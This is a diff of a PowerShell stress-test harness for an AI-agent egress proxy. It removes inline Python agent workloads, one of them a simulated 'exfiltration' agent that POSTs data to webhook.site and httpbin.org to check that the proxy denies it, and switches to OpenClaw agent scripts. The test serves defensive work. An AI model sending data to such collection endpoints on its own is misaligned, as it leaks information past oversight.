@@ -113,56 +113,23 @@ $InitialMem = [math]::Round((Get-Process -Id $ProxyPid).WorkingSet64 / 1MB, 1)
 # ── CSV Header ──
 "timestamp,elapsed_sec,rss_mb,docker_containers,proxy_healthy,wal_bytes" | Out-File -FilePath $MetricsCsv -Encoding utf8
 
-# ── Agent Scripts (Python fallback + OpenClaw if available) ──
-$AgentCodes = @(
-    # Agent 1: GitHub read (Allow path)
-    'import requests,time,random,os
-# Contained mode: DNAT routes 443 to MITM automatically.
-# Do NOT set proxies= — that forces CONNECT tunnel which bypasses DNAT.
-repos=["torvalds/linux","rust-lang/rust","golang/go","python/cpython"]
-for i in range(200):
-    r=repos[i%len(repos)]
-    try:
-        resp=requests.get(f"https://api.github.com/repos/{r}/issues?per_page=1",timeout=15)
-        print(f"[{i}] GET {r}/issues -> {resp.status_code}")
-    except Exception as e: print(f"[{i}] ERR: {e}")
-    time.sleep(random.uniform(10,25))',
-    # Agent 2: Exfiltration (Deny path)
-    'import requests,time,random,os
-# Contained mode: DNAT routes 443 to MITM automatically.
-# Do NOT set proxies= — that forces CONNECT tunnel which bypasses DNAT.
-targets=["http://webhook.site/test","http://httpbin.org/post"]
-for i in range(200):
-    url=random.choice(targets)
-    try:
-        resp=requests.post(url,json={"d":f"s{i}"},timeout=15)
-        print(f"[{i}] POST {url} -> {resp.status_code}")
-    except Exception as e: print(f"[{i}] ERR: {e}")
-    time.sleep(random.uniform(10,25))',
-    # Agent 3: Unknown hosts (Default-to-Caution, high volume)
-    'import requests,time,random,os
-# Contained mode: DNAT routes 443 to MITM automatically.
-# Do NOT set proxies= — that forces CONNECT tunnel which bypasses DNAT.
-urls=["https://catfact.ninja/fact","https://dog.ceo/api/breeds/image/random",
-"https://api.coindesk.com/v1/bpi/currentprice.json","http://numbersapi.com/42",
-"http://api.agify.io/?name=test","http://api.genderize.io/?name=test",
-"http://api.chucknorris.io/jokes/random","http://worldtimeapi.org/api/ip"]
-for i in range(300):
-    url=random.choice(urls)
-    try:
-        resp=requests.get(url,timeout=15)
-        print(f"[{i}] GET {url} -> {resp.status_code}")
-    except Exception as e: print(f"[{i}] ERR: {e}")
-    time.sleep(random.uniform(5,12))'
+# ── Agent Workloads: OpenClaw shell scripts in contained mode ──
+# Each agent runs openclaw agent --local with a different task prompt.
+# DNAT routes all HTTPS through MITM — no proxies= needed.
+# ANTHROPIC_API_KEY is passed through by gvm run --contained automatically.
+$WorkloadDir = Join-Path (Split-Path -Parent $MyInvocation.MyCommand.Path) "stress-workloads"
+$AgentScripts = @(
+    (Join-Path $WorkloadDir "openclaw-github.sh"),
+    (Join-Path $WorkloadDir "openclaw-exfil.sh"),
+    (Join-Path $WorkloadDir "openclaw-explore.sh")
 )
 
 # ── Launch Agents ──
 $AgentProcesses = @()
-$agentCount = [Math]::Min($Agents, $AgentCodes.Count)
+$agentCount = [Math]::Min($Agents, $AgentScripts.Count)
 for ($i = 0; $i -lt $agentCount; $i++) {
-    $scriptPath = Join-Path $ResultsDir "agents\agent-$($i+1).py"
-    $AgentCodes[$i] | Out-File -FilePath $scriptPath -Encoding utf8 -NoNewline
-    Write-Host "  Starting agent #$($i+1)..." -ForegroundColor Cyan
+    $scriptPath = $AgentScripts[$i]
+    Write-Host "  Starting agent #$($i+1) ($(Split-Path -Leaf $scriptPath))..." -ForegroundColor Cyan
 
     $proc = Start-Process -FilePath $GvmBin `
         -ArgumentList "run","--contained","--agent-id","stress-$($i+1)",$scriptPath `
